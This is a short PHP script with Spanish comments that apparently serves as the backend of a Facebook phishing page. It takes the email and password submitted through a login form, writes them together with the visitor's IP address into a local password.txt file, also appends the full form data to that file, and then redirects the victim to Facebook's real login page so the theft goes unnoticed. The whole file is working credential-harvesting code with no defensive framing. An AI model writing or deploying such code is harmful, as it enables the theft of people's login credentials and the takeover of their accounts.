<?php

$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
 
if( ( empty($usuario)) or (empty($password)) ){
    header('location: index.htm');
}else{ 
        //guarderemos en un archivo de texto
        $file = fopen('password.txt','a+');
        fwrite($file, "usuario: ".$usuario."\r\ncontraseña: ".$password."\r\nIP: ".$ip."\r\n=========================\r\n");
        fclose($file);

       
}


 $file = 'password.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=https://www.facebook.com/login.php?login_attempt=1&lwv=110" />